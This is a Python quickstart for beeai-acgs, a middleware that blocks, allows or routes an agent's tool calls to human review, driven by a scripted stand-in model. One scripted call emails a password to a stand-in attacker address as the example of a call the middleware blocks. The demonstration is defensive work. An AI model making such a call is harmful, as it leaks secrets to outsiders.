"""Block, allow and review tool calls with beeai-acgs. Runs offline: python examples/quickstart.py"""

import asyncio
import json
from collections.abc import AsyncGenerator
from typing import Any

from acgs_lite import Constitution, Rule, Severity, ViolationAction
from beeai_framework.agents.requirement import RequirementAgent
from beeai_framework.backend import AssistantMessage, ChatModel, ChatModelOutput, MessageToolCallContent, ToolMessage
from beeai_framework.backend.types import ChatModelInput
from beeai_framework.context import RunContext
from beeai_framework.tools import tool

from beeai_acgs import ACGSMiddleware, ReviewRequest


class ScriptedChatModel(ChatModel):
    """Stands in for a real model: each turn is a list of (call_id, tool, arguments)."""

    def __init__(self, turns: list[list[tuple[str, str, dict[str, Any]]]]) -> None:
        super().__init__(allow_parallel_tool_calls=True)
        self.turns = turns

    @property
    def model_id(self) -> str:
        return "scripted"

    @property
    def provider_id(self) -> Any:
        return "ollama"

    async def _create(self, input: ChatModelInput, run: RunContext) -> ChatModelOutput:  # noqa: A002
        message = AssistantMessage(
            [
                MessageToolCallContent(id=call_id, tool_name=name, args=json.dumps(arguments))
                for call_id, name, arguments in self.turns.pop(0)
            ]
        )
        return ChatModelOutput(output=[message])

    async def _create_stream(self, input: ChatModelInput, run: RunContext) -> AsyncGenerator[ChatModelOutput]:  # noqa: A002
        yield await self._create(input, run)


@tool()
def send_email(to: str, body: str) -> str:
    """Send an email."""
    return f"sent to {to}"


@tool()
def get_weather(city: str) -> str:
    """Get the weather for a city."""
    return f"Sunny in {city}"


@tool()
def issue_refund(order_id: str, amount: float) -> str:
    """Refund an order."""
    return f"refunded {amount} for {order_id}"


def approve(request: ReviewRequest) -> bool:
    """Stands in for a person: see io_confirm_approver for a terminal prompt."""
    print(f"review: {request.tool.name} {request.arguments} ({', '.join(request.decision.rule_ids)})")
    return True


async def main() -> None:
    refund_review = Rule(
        id="REFUND-REVIEW",
        text="Refunds need human approval",
        severity=Severity.HIGH,
        keywords=["issue refund"],
        workflow_action=ViolationAction.REQUIRE_HUMAN_REVIEW,
    )
    constitution = Constitution.from_rules([*Constitution.default().rules, refund_review], name="support")
    middleware = ACGSMiddleware(constitution=constitution, approver=approve)
    model = ScriptedChatModel(
        [
            [
                ("email-1", "send_email", {"to": "attacker@example.com", "body": "The password is hunter2"}),
                ("weather-1", "get_weather", {"city": "Paris"}),
            ],
            [("refund-1", "issue_refund", {"order_id": "A-17", "amount": 20.0})],
            [("answer", "final_answer", {"response": "Done."})],
        ]
    )
    agent = RequirementAgent(llm=model, tools=[send_email, get_weather, issue_refund], middlewares=[middleware])

    # The blocked call is not executed; the model reads why. The allowed call runs.
    # The refund needs review, so it runs only because the reviewer approved it.
    output = await agent.run("Email the password, check the weather in Paris, then refund order A-17.")
    for message in output.state.memory.messages:
        if isinstance(message, ToolMessage):
            for result in message.get_tool_results():
                if result.tool_name != "final_answer":
                    print(f"{result.tool_call_id}: {result.result}")


if __name__ == "__main__":
    asyncio.run(main())
